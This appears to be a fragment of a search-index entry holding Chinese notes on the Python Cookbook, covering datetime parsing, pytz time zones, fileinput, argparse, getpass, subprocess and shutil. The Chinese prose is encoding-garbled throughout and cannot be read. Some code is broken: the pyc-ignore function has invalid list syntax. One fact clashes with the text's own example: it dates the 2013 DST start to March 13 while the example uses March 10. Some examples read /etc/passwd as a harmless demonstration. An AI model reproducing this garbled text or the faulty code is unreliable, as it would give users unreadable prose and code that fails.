%Y ä»£è¡¨ 4 ä½æ•°å¹´ä»½ï¼Œ%m ä»£è¡¨ä¸¤ä½æ•°æœˆä»½ã€‚ è¿˜æœ‰ä¸€ç‚¹å€¼å¾—æ³¨æ„çš„æ˜¯è¿™äº›æ ¼å¼åŒ–å ä½ç¬¦ä¹Ÿå¯ä»¥åè¿‡æ¥ä½¿ç”¨ï¼Œå°†æ—¥æœŸ è¾“å‡ºä¸ºæŒ‡å®šçš„æ ¼å¼å­—ç¬¦ä¸²å½¢å¼ã€‚ strptime() çš„æ€§èƒ½è¦æ¯”ä½ æƒ³è±¡ä¸­çš„å·®å¾ˆå¤šï¼Œå› ä¸ºå®ƒæ˜¯ä½¿ ç”¨çº¯ Python å®ç°ï¼Œå¹¶ä¸”å¿…é¡»å¤„ç†æ‰€æœ‰çš„ç³»ç»Ÿæœ¬åœ°è®¾ç½®ã€‚ å¦‚æœä½ è¦åœ¨ä»£ç ä¸­éœ€è¦è§£æå¤§ é‡çš„æ—¥æœŸå¹¶ä¸”å·²ç»çŸ¥é“äº†æ—¥æœŸå­—ç¬¦ä¸²çš„ç¡®åˆ‡æ ¼å¼ï¼Œå¯ä»¥è‡ªå·±å®ç°ä¸€å¥—è§£ææ–¹æ¡ˆæ¥è·å– æ›´å¥½çš„æ€§èƒ½ã€‚ æ¯”å¦‚ï¼Œå¦‚æœä½ å·²ç»çŸ¥é“æ‰€ä»¥æ—¥æœŸæ ¼å¼æ˜¯ YYYY-MM-DD ï¼Œä½ å¯ä»¥åƒä¸‹é¢è¿™æ · å®ç°ä¸€ä¸ªè§£æå‡½æ•°: from datetime import datetime def parse_ymd(s): year_s, mon_s, day_s = s.split('-') return datetime(int(year_s), int(mon_s), int(day_s)) ç»“åˆæ—¶åŒºçš„æ—¥æœŸæ“ä½œ ä½ æœ‰ä¸€ä¸ªå®‰æ’åœ¨ 2012 å¹´ 12 æœˆ 21 æ—¥æ—©ä¸Š 9:30 çš„ç”µè¯ä¼šè®®ï¼Œåœ°ç‚¹åœ¨èŠåŠ å“¥ã€‚ è€Œä½  çš„æœ‹å‹åœ¨å°åº¦çš„ç­åŠ ç½—å°”ï¼Œé‚£ä¹ˆä»–åº”è¯¥åœ¨å½“åœ°æ—¶é—´å‡ ç‚¹å‚åŠ è¿™ä¸ªä¼šè®®å‘¢? å¯¹å‡ ä¹æ‰€æœ‰æ¶‰åŠåˆ°æ—¶åŒºçš„é—®é¢˜ï¼Œä½ éƒ½åº”è¯¥ä½¿ç”¨ pytz æ¨¡å—ã€‚ è¿™ä¸ªåŒ…æä¾›äº† Olson æ—¶ åŒºæ•°æ®åº“ï¼Œå®ƒæ˜¯æ—¶åŒºä¿¡æ¯çš„äº‹å®ä¸Šçš„æ ‡å‡†ï¼Œåœ¨å¾ˆå¤šè¯­è¨€å’Œæ“ä½œç³»ç»Ÿé‡Œé¢éƒ½å¯ä»¥æ‰¾åˆ°ã€‚ pytz æ¨¡å—ä¸€ä¸ªä¸»è¦ç”¨é€”æ˜¯å°† datetime åº“åˆ›å»ºçš„ç®€å•æ—¥æœŸå¯¹è±¡æœ¬åœ°åŒ–ã€‚æ¯”å¦‚ï¼Œä¸‹ é¢å¦‚ä½•è¡¨ç¤ºä¸€ä¸ªèŠåŠ å“¥æ—¶é—´çš„ç¤ºä¾‹: >>> from datetime import datetime >>> from pytz import timezone >>> d = datetime(2012, 12, 21, 9, 30, 0) >>> print(d) 2012-12-21 09:30:00 >>> >>> # Localize the date for Chicago >>> central = timezone('US/Central') >>> loc_d = central.localize(d) >>> print(loc_d) 2012-12-21 09:30:00-06:00 >>> å¦‚æœä½ æ‰“ç®—åœ¨æœ¬åœ°åŒ–æ—¥æœŸä¸Šæ‰§è¡Œè®¡ç®—ï¼Œä½ éœ€è¦ç‰¹åˆ«æ³¨æ„å¤ä»¤æ—¶è½¬æ¢å’Œå…¶ä»–ç»†èŠ‚ã€‚ æ¯” å¦‚ï¼Œåœ¨ 2013 å¹´ï¼Œç¾å›½æ ‡å‡†å¤ä»¤æ—¶æ—¶é—´å¼€å§‹äºæœ¬åœ°æ—¶é—´ 3 æœˆ 13 æ—¥å‡Œæ™¨ 2:00(åœ¨é‚£æ—¶ï¼Œæ—¶ é—´å‘å‰è·³è¿‡ä¸€å°æ—¶)ã€‚ å¦‚æœä½ æ­£åœ¨æ‰§è¡Œæœ¬åœ°è®¡ç®—ï¼Œä½ ä¼šå¾—åˆ°ä¸€ä¸ªé”™è¯¯ã€‚æ¯”å¦‚: >>> d = datetime(2013, 3, 10, 1, 45) >>> loc_d = central.localize(d) >>> print(loc_d) 2013-03-10 01:45:00-06:00 >>> later = loc_d + timedelta(minutes=30) >>> print(later) 2013-03-10 02:15:00-06:00 # WRONG! WRONG! >>> ç»“æœé”™è¯¯æ˜¯å› ä¸ºå®ƒå¹¶æ²¡æœ‰è€ƒè™‘åœ¨æœ¬åœ°æ—¶é—´ä¸­æœ‰ä¸€å°æ—¶çš„è·³è·ƒã€‚ä¸ºäº†ä¿®æ­£è¿™ä¸ªé”™è¯¯ï¼Œ å¯ä»¥ä½¿ç”¨æ—¶åŒºå¯¹è±¡ normalize() æ–¹æ³•ã€‚æ¯”å¦‚: >>> from datetime import timedelta >>> later = central.normalize(loc_d + timedelta(minutes=30)) >>> print(later) 2013-03-10 03:15:00-05:00 >>> ä¸ºäº†ä¸è®©ä½ è¢«è¿™äº›ä¸œä¸œå¼„çš„æ™•å¤´è½¬å‘ï¼Œå¤„ç†æœ¬åœ°åŒ–æ—¥æœŸçš„é€šå¸¸çš„ç­–ç•¥å…ˆå°†æ‰€æœ‰æ—¥ æœŸè½¬æ¢ä¸º UTC æ—¶é—´ï¼Œå¹¶ç”¨å®ƒæ¥æ‰§è¡Œæ‰€æœ‰çš„ä¸­é—´å­˜å‚¨å’Œæ“ä½œ: >>> print(loc_d) 2013-03-10 01:45:00-06:00 >>> utc_d = loc_d.astimezone(pytz.utc) >>> print(utc_d) 2013-03-10 07:45:00+00:00 >>> ä¸€æ—¦è½¬æ¢ä¸º UTCï¼Œä½ å°±ä¸ç”¨å»æ‹…å¿ƒè·Ÿå¤ä»¤æ—¶ç›¸å…³çš„é—®é¢˜äº†ã€‚ å› æ­¤ï¼Œä½ å¯ä»¥è·Ÿä¹‹å‰ ä¸€æ ·æ”¾å¿ƒçš„æ‰§è¡Œå¸¸è§çš„æ—¥æœŸè®¡ç®—ã€‚ å½“ä½ æƒ³å°†è¾“å‡ºå˜ä¸ºæœ¬åœ°æ—¶é—´çš„æ—¶å€™ï¼Œä½¿ç”¨åˆé€‚çš„æ—¶åŒº å»è½¬æ¢ä¸‹å°±è¡Œäº†ã€‚æ¯”å¦‚: >>> later_utc = utc_d + timedelta(minutes=30) >>> print(later_utc.astimezone(central)) 2013-03-10 03:15:00-05:00 >>> å¾—åˆ°æ—¶åŒºå, ä½¿ç”¨ ISO 3166 å›½å®¶ä»£ç ä½œä¸ºå…³é”®å­—å»æŸ¥é˜…å­—å…¸ pytz.country_timezones: >>> pytz.country_timezones['IN'] ['Asia/Kolkata'] >>>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-Number,-date,-time.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Number,-date,-time.html"},{"title":"è„šæœ¬ç¼–ç¨‹ä¸ç³»ç»Ÿç®¡ç†","text":"è®¸å¤šäººä½¿ç”¨ Python ä½œä¸ºä¸€ä¸ª shell è„šæœ¬çš„æ›¿ä»£ï¼Œç”¨æ¥å®ç°å¸¸ç”¨ç³»ç»Ÿä»»åŠ¡çš„è‡ªåŠ¨åŒ–ï¼Œ å¦‚æ–‡ä»¶çš„æ“ä½œï¼Œç³»ç»Ÿçš„é…ç½®ç­‰ã€‚æœ¬ç« çš„ä¸»è¦ç›®æ ‡æ˜¯æè¿°å…³äºç¼–å†™è„šæœ¬æ—¶å€™ç»å¸¸é‡åˆ°çš„ä¸€ äº›åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œè§£æå‘½ä»¤è¡Œé€‰é¡¹ã€è·å–æœ‰ç”¨çš„ç³»ç»Ÿé…ç½®æ•°æ®ç­‰ç­‰ã€‚ç¬¬ 5 ç« ä¹ŸåŒ…å«äº†ä¸æ–‡ ä»¶å’Œç›®å½•ç›¸å…³çš„ä¸€èˆ¬ä¿¡æ¯ã€‚ é€šè¿‡é‡å®šå‘/ç®¡é“/æ–‡ä»¶æ¥å—è¾“å…¥ é—®é¢˜ ä½ å¸Œæœ›ä½ çš„è„šæœ¬æ¥å—ä»»ä½•ç”¨æˆ·è®¤ä¸ºæœ€ç®€å•çš„è¾“å…¥æ–¹å¼ã€‚åŒ…æ‹¬å°†å‘½ä»¤è¡Œçš„è¾“å‡ºé€šè¿‡ ç®¡é“ä¼ é€’ç»™è¯¥è„šæœ¬ã€é‡å®šå‘æ–‡ä»¶åˆ°è¯¥è„šæœ¬ï¼Œæˆ–åœ¨å‘½ä»¤è¡Œä¸­ä¼ é€’ä¸€ä¸ªæ–‡ä»¶åæˆ–æ–‡ä»¶ååˆ—è¡¨ ç»™è¯¥è„šæœ¬ã€‚ è§£å†³æ–¹æ¡ˆ Python å†…ç½®çš„ fileinput æ¨¡å—è®©è¿™ä¸ªå˜å¾—ç®€å•ã€‚å¦‚æœä½ æœ‰ä¸€ä¸ªä¸‹é¢è¿™æ ·çš„è„šæœ¬: #!/usr/bin/env python3 import fileinput with fileinput.input() as f_input: for line in f_input: print(line, end='') ä½œç”¨å°±æ˜¯å°†æ–‡ä»¶åä¼ é€’ç»™Pythonè„šæœ¬è®©å…¶è¾“å‡ºæ–‡ä»¶å†…å®¹ é‚£ä¹ˆä½ å°±èƒ½ä»¥å‰é¢æåˆ°çš„æ‰€æœ‰æ–¹å¼æ¥ä¸ºæ­¤è„šæœ¬æä¾›è¾“å…¥ã€‚å‡è®¾ä½ å°†æ­¤è„šæœ¬ä¿å­˜ä¸º filein.py å¹¶å°†å…¶å˜ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å¯ä»¥åƒä¸‹é¢è¿™æ ·è°ƒç”¨å®ƒï¼Œå¾—åˆ°æœŸæœ›çš„è¾“å‡º: $ ls | ./filein.py # Prints a directory listing to stdout. $ ./filein.py /etc/passwd # Reads /etc/passwd to stdout. $ ./filein.py < /etc/passwd # Reads /etc/passwd to stdout. è®¨è®º fileinput.input() åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ª FileInput ç±»çš„å®ä¾‹ã€‚è¯¥å®ä¾‹é™¤äº†æ‹¥æœ‰ä¸€äº› æœ‰ç”¨çš„å¸®åŠ©æ–¹æ³•å¤–ï¼Œå®ƒè¿˜å¯è¢«å½“åšä¸€ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨ä½¿ç”¨ã€‚å› æ­¤ï¼Œæ•´åˆèµ·æ¥ï¼Œå¦‚æœæˆ‘ä»¬ è¦å†™ä¸€ä¸ªæ‰“å°å¤šä¸ªæ–‡ä»¶è¾“å‡ºçš„è„šæœ¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦åœ¨è¾“å‡ºä¸­åŒ…å«æ–‡ä»¶åå’Œè¡Œå·ï¼Œå¦‚ä¸‹æ‰€ ç¤º: >>> import fileinput >>> with fileinput.input('/etc/passwd') as f: >>> for line in f: ... print(f.filename(), f.lineno(), line, end='') ... /etc/passwd 1 ## /etc/passwd 2 # User Database /etc/passwd 3 # <other output omitted> é€šè¿‡å°†å®ƒä½œä¸ºä¸€ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨ä½¿ç”¨ï¼Œå¯ä»¥ç¡®ä¿å®ƒä¸å†ä½¿ç”¨æ—¶æ–‡ä»¶èƒ½è‡ªåŠ¨å…³é—­ï¼Œè€Œ ä¸”æˆ‘ä»¬åœ¨ä¹‹åè¿˜æ¼”ç¤ºäº† FileInput çš„ä¸€äº›æœ‰ç”¨çš„å¸®åŠ©æ–¹æ³•æ¥è·å–è¾“å‡ºä¸­çš„ä¸€äº›å…¶ä»–ä¿¡ æ¯ã€‚ ç»ˆæ­¢ç¨‹åºå¹¶ç»™å‡ºé”™è¯¯ä¿¡æ¯ é—®é¢˜ ä½ æƒ³å‘æ ‡å‡†é”™è¯¯æ‰“å°ä¸€æ¡æ¶ˆæ¯å¹¶è¿”å›æŸä¸ªéé›¶çŠ¶æ€ç æ¥ç»ˆæ­¢ç¨‹åºè¿è¡Œ è§£å†³æ–¹æ¡ˆ ä½ æœ‰ä¸€ä¸ªç¨‹åºåƒä¸‹é¢è¿™æ ·ç»ˆæ­¢ï¼ŒæŠ›å‡ºä¸€ä¸ª SystemExit å¼‚å¸¸ï¼Œä½¿ç”¨é”™è¯¯æ¶ˆæ¯ä½œä¸ºå‚ æ•°ã€‚ä¾‹å¦‚: raise SystemExit('It failed!') å®ƒä¼šå°†æ¶ˆæ¯åœ¨ sys.stderr ä¸­æ‰“å°ï¼Œç„¶åç¨‹åºä»¥çŠ¶æ€ç  1 é€€å‡ºã€‚ è§£æå‘½ä»¤è¡Œé€‰é¡¹ é—®é¢˜ ä½ çš„ç¨‹åºå¦‚ä½•èƒ½å¤Ÿè§£æå‘½ä»¤è¡Œé€‰é¡¹ï¼ˆä½äº sys.argv ä¸­ï¼‰ è§£å†³æ–¹æ¡ˆ argparse æ¨¡å—å¯è¢«ç”¨æ¥è§£æå‘½ä»¤è¡Œé€‰é¡¹: import argparse parser = argparse.ArgumentParser(description='Search some files') parser.add_argument(dest='filenames',metavar='filename', nargs='*') parser.add_argument('-p', '--pat',metavar='pattern', required=True, dest='patterns', action='append', help='text pattern to search for') è®¨è®º argparse æ¨¡å—æ˜¯æ ‡å‡†åº“ä¸­æœ€å¤§çš„æ¨¡å—ä¹‹ä¸€ï¼Œæ‹¥æœ‰å¤§é‡çš„é…ç½®é€‰é¡¹ã€‚ ä¸º äº† è§£ æ å‘½ ä»¤ è¡Œ é€‰ é¡¹ï¼Œ ä½  é¦– å…ˆ è¦ åˆ› å»º ä¸€ ä¸ª ArgumentParser å® ä¾‹ï¼Œå¹¶ ä½¿ ç”¨ add_argument() æ–¹æ³•å£°æ˜ä½ æƒ³è¦æ”¯æŒçš„é€‰é¡¹ã€‚åœ¨æ¯ä¸ª add_argument() è°ƒç”¨ä¸­ï¼Œdest å‚æ•°æŒ‡å®šè§£æç»“æœè¢«æŒ‡æ´¾ç»™å±æ€§çš„åå­—ã€‚metavar å‚æ•°è¢«ç”¨æ¥ç”Ÿæˆå¸®åŠ©ä¿¡æ¯ã€‚action å‚æ•°æŒ‡å®šè·Ÿå±æ€§å¯¹åº”çš„å¤„ç†é€»è¾‘ï¼Œé€šå¸¸çš„å€¼ä¸º store , è¢«ç”¨æ¥å­˜å‚¨æŸä¸ªå€¼æˆ–è®²å¤šä¸ªå‚æ•° å€¼æ”¶é›†åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­ã€‚ä¸‹é¢çš„å‚æ•°æ”¶é›†æ‰€æœ‰å‰©ä½™çš„å‘½ä»¤è¡Œå‚æ•°åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­ã€‚åœ¨æœ¬ä¾‹ä¸­ å®ƒè¢«ç”¨æ¥æ„é€ ä¸€ä¸ªæ–‡ä»¶ååˆ—è¡¨: parser.add_argument(dest='filenames',metavar='filename', nargs='*') æ³¨è§£ Python3 æœ‰ä¸€ä¸ªclickæ¨¡å—å¯ä»¥é€šè¿‡è£…é¥°å™¨æ¥ä½¿ç”¨, æ›´æ–¹ä¾¿. è¿è¡Œæ—¶å¼¹å‡ºå¯†ç è¾“å…¥æç¤º é—®é¢˜ ä½ å†™äº†ä¸ªè„šæœ¬ï¼Œè¿è¡Œæ—¶éœ€è¦ä¸€ä¸ªå¯†ç ã€‚æ­¤è„šæœ¬æ˜¯äº¤äº’å¼çš„ï¼Œå› æ­¤ä¸èƒ½å°†å¯†ç åœ¨è„šæœ¬ ä¸­ç¡¬ç¼–ç ï¼Œè€Œæ˜¯éœ€è¦å¼¹å‡ºä¸€ä¸ªå¯†ç è¾“å…¥æç¤ºï¼Œè®©ç”¨æˆ·è‡ªå·±è¾“å…¥ è§£å†³æ–¹æ¡ˆ è¿™æ—¶å€™ Python çš„ getpass æ¨¡å—æ­£æ˜¯ä½ æ‰€éœ€è¦çš„ã€‚ä½ å¯ä»¥è®©ä½ å¾ˆè½»æ¾çš„å¼¹å‡ºå¯†ç  è¾“å…¥æç¤ºï¼Œå¹¶ä¸”ä¸ä¼šåœ¨ç”¨æˆ·ç»ˆç«¯å›æ˜¾å¯†ç ã€‚ä¸‹é¢æ˜¯å…·ä½“ä»£ç : import getpass user = getpass.getuser() passwd = getpass.getpass() if svc_login(user, passwd): # You must write svc_login() print('Yay!') else: print('Boo!') åœ¨æ­¤ä»£ç ä¸­ï¼Œsvc_login() æ˜¯ä½ è¦å®ç°çš„å¤„ç†å¯†ç çš„å‡½æ•°ï¼Œå…·ä½“çš„å¤„ç†è¿‡ç¨‹ä½ è‡ªå·± å†³å®šã€‚ è®¨è®º æ³¨æ„åœ¨å‰é¢ä»£ç ä¸­ getpass.getuser() ä¸ä¼šå¼¹å‡ºç”¨æˆ·åçš„è¾“å…¥æç¤ºã€‚å®ƒä¼šæ ¹æ®è¯¥ ç”¨æˆ·çš„ shell ç¯å¢ƒæˆ–è€…ä¼šä¾æ®æœ¬åœ°ç³»ç»Ÿçš„å¯†ç åº“ï¼ˆæ”¯æŒ pwd æ¨¡å—çš„å¹³å°ï¼‰æ¥ä½¿ç”¨å½“å‰ç”¨ æˆ·çš„ç™»å½•åï¼Œ å¦‚æœä½ æƒ³æ˜¾ç¤ºçš„å¼¹å‡ºç”¨æˆ·åè¾“å…¥æç¤ºï¼Œä½¿ç”¨å†…ç½®çš„ input å‡½æ•°: user = input('Enter your username: ') è¿˜æœ‰ä¸€ç‚¹å¾ˆé‡è¦ï¼Œæœ‰äº›ç³»ç»Ÿå¯èƒ½ä¸æ”¯æŒ getpass() æ–¹æ³•éšè—è¾“å…¥å¯†ç ã€‚è¿™ç§æƒ…å†µ ä¸‹ï¼ŒPython ä¼šæå‰è­¦å‘Šä½ è¿™äº›é—®é¢˜ï¼ˆä¾‹å¦‚å®ƒä¼šè­¦å‘Šä½ è¯´å¯†ç ä¼šä»¥æ˜æ–‡å½¢å¼æ˜¾ç¤ºï¼‰ è·å–ç»ˆç«¯çš„å¤§å° é—®é¢˜ ä½ éœ€è¦çŸ¥é“å½“å‰ç»ˆç«¯çš„å¤§å°ä»¥ä¾¿æ­£ç¡®çš„æ ¼å¼åŒ–è¾“å‡ºã€‚ è§£å†³æ–¹æ¡ˆ ä½¿ç”¨ os.get_terminal_size() å‡½æ•°æ¥åšåˆ°è¿™ä¸€ç‚¹: >>> import os >>> sz = os.get_terminal_size() >>> sz os.terminal_size(columns=80, lines=24) >>> sz.columns 80 >>> sz.lines 24 >>> è®¨è®º æœ‰å¤ªå¤šæ–¹å¼æ¥å¾—çŸ¥ç»ˆç«¯å¤§å°äº†ï¼Œä»è¯»å–ç¯å¢ƒå˜é‡åˆ°æ‰§è¡Œåº•å±‚çš„ ioctl() å‡½æ•°ç­‰ç­‰ã€‚ ä¸è¿‡ï¼Œä¸ºä»€ä¹ˆè¦å»ç ”ç©¶è¿™äº›å¤æ‚çš„åŠæ³•è€Œä¸æ˜¯ä»…ä»…è°ƒç”¨ä¸€ä¸ªç®€å•çš„å‡½æ•°å‘¢ï¼Ÿ æ‰§è¡Œå¤–éƒ¨å‘½ä»¤å¹¶è·å–å®ƒçš„è¾“å‡º é—®é¢˜ ä½ æƒ³æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨å‘½ä»¤å¹¶ä»¥ Python å­—ç¬¦ä¸²çš„å½¢å¼è·å–æ‰§è¡Œç»“æœã€‚ è§£å†³æ–¹æ¡ˆ ä½¿ç”¨ subprocess.check_output() å‡½æ•°ã€‚ä¾‹å¦‚: import subprocess out_bytes = subprocess.check_output(['netstat','-a']) è¿™æ®µä»£ç æ‰§è¡Œä¸€ä¸ªæŒ‡å®šçš„å‘½ä»¤å¹¶å°†æ‰§è¡Œç»“æœä»¥ä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ã€‚å¦‚æœ ä½ éœ€è¦æ–‡æœ¬å½¢å¼è¿”å›ï¼ŒåŠ ä¸€ä¸ªè§£ç æ­¥éª¤å³å¯ã€‚ä¾‹å¦‚: out_text = out_bytes.decode('utf-8') å¦‚æœè¢«æ‰§è¡Œçš„å‘½ä»¤ä»¥éé›¶ç è¿”å›ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ä¸‹é¢çš„ä¾‹å­æ•è·åˆ°é”™è¯¯å¹¶è·å–è¿” å›ç : try: out_bytes = subprocess.check_output(['cmd','arg1','arg2']) except subprocess.CalledProcessError as e: out_bytes = e.output # Output generated before error code = e.returncode # Return code é»˜è®¤æƒ…å†µä¸‹ï¼Œcheck_output() ä»…ä»…è¿”å›è¾“å…¥åˆ°æ ‡å‡†è¾“å‡ºçš„å€¼ã€‚å¦‚æœä½ éœ€è¦åŒæ—¶æ”¶ é›†æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºï¼Œä½¿ç”¨ stderr å‚æ•°: out_bytes = subprocess.check_output(['cmd','arg1','arg2'], stderr=subprocess.STDOUT) å¦‚æœä½ éœ€è¦ç”¨ä¸€ä¸ªè¶…æ—¶æœºåˆ¶æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨ timeout å‚æ•°: try: out_bytes = subprocess.check_output(['cmd','arg1','arg2'], timeout=5) except subprocess.TimeoutExpired as e: ... é€šå¸¸æ¥è®²ï¼Œå‘½ä»¤çš„æ‰§è¡Œä¸éœ€è¦ä½¿ç”¨åˆ°åº•å±‚ shell ç¯å¢ƒï¼ˆæ¯”å¦‚ shã€bashï¼‰ã€‚ä¸€ä¸ªå­—ç¬¦ä¸² åˆ—è¡¨ä¼šè¢«ä¼ é€’ç»™ä¸€ä¸ªä½çº§ç³»ç»Ÿå‘½ä»¤ï¼Œæ¯”å¦‚ os.execve() ã€‚å¦‚æœä½ æƒ³è®©å‘½ä»¤è¢«ä¸€ä¸ª shell æ‰§è¡Œï¼Œä¼ é€’ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œå¹¶è®¾ç½®å‚æ•° shell=True . æœ‰æ—¶å€™ä½ æƒ³è¦ Python å»æ‰§è¡Œ ä¸€ä¸ªå¤æ‚çš„ shell å‘½ä»¤çš„æ—¶å€™è¿™ä¸ªå°±å¾ˆæœ‰ç”¨äº†ï¼Œæ¯”å¦‚ç®¡é“æµã€I/O é‡å®šå‘å’Œå…¶ä»–ç‰¹æ€§ã€‚ ä¾‹å¦‚: out_bytes = subprocess.check_output('grep python | wc > out', shell=True) éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ shell ä¸­æ‰§è¡Œå‘½ä»¤ä¼šå­˜åœ¨ä¸€å®šçš„å®‰å…¨é£é™©ï¼Œç‰¹åˆ«æ˜¯å½“å‚æ•°æ¥è‡ªäºç”¨ æˆ·è¾“å…¥æ—¶ã€‚è¿™æ—¶å€™å¯ä»¥ä½¿ç”¨ shlex.quote() å‡½æ•°æ¥å°†å‚æ•°æ­£ç¡®çš„ç”¨åŒå¼•ç”¨å¼•èµ·æ¥ã€‚ è®¨è®º ä½¿ç”¨ check_output() å‡½æ•°æ˜¯æ‰§è¡Œå¤–éƒ¨å‘½ä»¤å¹¶è·å–å…¶è¿”å›å€¼çš„æœ€ç®€å•æ–¹å¼ã€‚ä½†æ˜¯ï¼Œ å¦‚æœä½ éœ€è¦å¯¹å­è¿›ç¨‹åšæ›´å¤æ‚çš„äº¤äº’ï¼Œæ¯”å¦‚ç»™å®ƒå‘é€è¾“å…¥ï¼Œä½ å¾—é‡‡ç”¨å¦å¤–ä¸€ç§æ–¹æ³•ã€‚è¿™ æ—¶å€™å¯ç›´æ¥ä½¿ç”¨ subprocess.Popen ç±»: import subprocess # Some text to send text = b''' hello world this is a test goodbye ''' # Launch a command with pipes p = subprocess.Popen(['wc'], stdout = subprocess.PIPE, stdin = subprocess.PIPE) # Send the data and get the output stdout, stderr = p.communicate(text) # To interpret as text, decode out = stdout.decode('utf-8') err = stderr.decode('utf-8') subprocess æ¨¡å—å¯¹äºä¾èµ– TTY çš„å¤–éƒ¨å‘½ä»¤ä¸åˆé€‚ç”¨ã€‚ä¾‹å¦‚ï¼Œä½ ä¸èƒ½ä½¿ç”¨å®ƒæ¥è‡ª åŠ¨åŒ–ä¸€ä¸ªç”¨æˆ·è¾“å…¥å¯†ç çš„ä»»åŠ¡ï¼ˆæ¯”å¦‚ä¸€ä¸ª ssh ä¼šè¯ï¼‰ã€‚è¿™æ—¶å€™ï¼Œä½ éœ€è¦ä½¿ç”¨åˆ°ç¬¬ä¸‰æ–¹æ¨¡ å—äº†ï¼Œæ¯”å¦‚åŸºäºè‘—åçš„ expect å®¶æ—çš„å·¥å…·ï¼ˆpexpect æˆ–ç±»ä¼¼çš„ï¼‰ å¤åˆ¶æˆ–è€…ç§»åŠ¨æ–‡ä»¶å’Œç›®å½• é—®é¢˜ ä½ æƒ³è¦å¤åˆ¶æˆ–ç§»åŠ¨æ–‡ä»¶å’Œç›®å½•ï¼Œä½†æ˜¯åˆä¸æƒ³è°ƒç”¨ shell å‘½ä»¤ã€‚ è§£å†³æ–¹æ¡ˆ shutil æ¨¡å—æœ‰å¾ˆå¤šä¾¿æ·çš„å‡½æ•°å¯ä»¥å¤åˆ¶æ–‡ä»¶å’Œç›®å½•ã€‚ä½¿ç”¨èµ·æ¥éå¸¸ç®€å•: import shutil # Copy src to dst. (cp src dst) shutil.copy(src, dst) # Copy files, but preserve metadata (cp -p src dst) shutil.copy2(src, dst) # Copy directory tree (cp -R src dst) shutil.copytree(src, dst) # Move src to dst (mv src dst) shutil.move(src, dst) è¿™äº›å‡½æ•°çš„å‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²å½¢å¼çš„æ–‡ä»¶æˆ–ç›®å½•åã€‚åº•å±‚è¯­ä¹‰æ¨¡æ‹Ÿäº†ç±»ä¼¼çš„ Unix å‘½ ä»¤ï¼Œå¦‚ä¸Šé¢çš„æ³¨é‡Šéƒ¨åˆ†ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯¹äºç¬¦å·é“¾æ¥è€Œå·²è¿™äº›å‘½ä»¤å¤„ç†çš„æ˜¯å®ƒæŒ‡å‘çš„ä¸œè¥¿ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæºæ–‡ ä»¶æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œé‚£ä¹ˆç›®æ ‡æ–‡ä»¶å°†ä¼šæ˜¯ç¬¦å·é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶ã€‚å¦‚æœä½ åªæƒ³å¤åˆ¶ç¬¦å·é“¾ æ¥æœ¬èº«ï¼Œé‚£ä¹ˆéœ€è¦æŒ‡å®šå…³é”®å­—å‚æ•° follow_symlinks , å¦‚ä¸‹ï¼š å¦‚æœä½ æƒ³ä¿ç•™è¢«å¤åˆ¶ç›®å½•ä¸­çš„ç¬¦å·é“¾æ¥ï¼Œåƒè¿™æ ·åš: shutil.copytree(src, dst, symlinks=True) copytree() å¯ä»¥è®©ä½ åœ¨å¤åˆ¶è¿‡ç¨‹ä¸­é€‰æ‹©æ€§çš„å¿½ç•¥æŸäº›æ–‡ä»¶æˆ–ç›®å½•ã€‚ä½ å¯ä»¥æä¾›ä¸€ ä¸ªå¿½ç•¥å‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªç›®å½•åå’Œæ–‡ä»¶ååˆ—è¡¨ä½œä¸ºè¾“å…¥ï¼Œè¿”å›ä¸€ä¸ªå¿½ç•¥çš„åç§°åˆ—è¡¨ã€‚ä¾‹å¦‚: def ignore_pyc_files(dirname, filenames): return [name in filenames if name.endswith('.pyc')] shutil.copytree(src, dst, ignore=ignore_pyc_files) ç”±äºå¿½ç•¥æŸç§æ¨¡å¼çš„æ–‡ä»¶åæ˜¯å¾ˆå¸¸è§çš„ï¼Œå› æ­¤ä¸€ä¸ªä¾¿æ·çš„å‡½æ•° ignore_patterns() å·²ç»åŒ…å«åœ¨é‡Œé¢äº†ã€‚ä¾‹å¦‚: shutil.copytree(src, dst, ignore=shutil.ignore_patterns('*~', '*.pyc')) è®¨è®º å¯¹äºæ–‡ä»¶å…ƒæ•°æ®ä¿¡æ¯ï¼Œcopy2() è¿™æ ·çš„å‡½æ•°åªèƒ½å°½è‡ªå·±æœ€å¤§èƒ½åŠ›æ¥ä¿ç•™å®ƒã€‚è®¿é—®æ—¶é—´ã€åˆ›å»ºæ—¶é—´å’Œæƒé™è¿™äº›åŸºæœ¬ä¿¡æ¯ ä¼šè¢«ä¿ç•™ï¼Œä½†æ˜¯å¯¹äºæ‰€æœ‰è€…ã€ACLsã€èµ„æº fork å’Œå…¶ä»–æ›´æ·±å±‚æ¬¡çš„æ–‡ä»¶å…ƒä¿¡æ¯å°±è¯´ä¸å‡† äº†ï¼Œè¿™ä¸ªè¿˜å¾—ä¾èµ–äºåº•å±‚æ“ä½œç³»ç»Ÿç±»å‹å’Œç”¨æˆ·æ‰€æ‹¥æœ‰çš„è®¿é—®æƒé™ã€‚ä½ é€šå¸¸ä¸ä¼šå»ä½¿ç”¨ shutil.copytree() å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå¤‡ä»½ã€‚ ä½¿ç”¨ copytree() 